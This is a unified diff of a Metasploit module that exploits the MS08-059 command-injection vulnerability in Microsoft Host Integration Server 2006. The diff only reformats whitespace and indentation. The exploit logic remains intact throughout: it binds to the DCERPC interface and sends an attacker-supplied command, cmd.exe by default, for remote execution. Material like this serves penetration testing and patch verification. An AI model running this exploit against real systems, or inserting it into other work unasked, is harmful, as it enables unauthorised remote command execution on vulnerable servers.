@@ -7,36 +7,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',
+        'Description' => %q{
           This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.
-      },
-      'DefaultOptions' =>
-        {
+        },
+        'DefaultOptions' => {
           'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
         },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'MSB', 'MS08-059' ],
           [ 'CVE', '2008-3466' ],
           [ 'OSVDB', '49068' ],
           [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745' ],
         ],
-      'DisclosureDate' => '2008-10-14'))
+        'DisclosureDate' => '2008-10-14'
+      )
+    )
 
-      register_options(
-        [
+    register_options(
+      [
         Opt::RPORT(0),
         OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),
         OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])
-        ])
+      ]
+    )
   end
 
   def run
-
     dport = datastore['RPORT'].to_i
 
     if (dport != 0)
@@ -54,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-        print_status("Discovered Host Integration Server RPC service on port #{dport}")
+      print_status("Discovered Host Integration Server RPC service on port #{dport}")
     end
 
     connect(true, { 'RPORT' => dport })
@@ -65,17 +67,16 @@ class MetasploitModule < Msf::Auxiliary
     dcerpc_bind(handle)
     print_status("Bound to #{handle} ...")
 
-    cmd =  NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")
+    cmd = NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")
 
     print_status("Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}")
 
-      begin
-        dcerpc_call(0x01, cmd)
-        rescue Rex::Proto::DCERPC::Exceptions::NoResponse
-      end
+    begin
+      dcerpc_call(0x01, cmd)
+    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
+    end
 
     disconnect
-
   end
 end
 
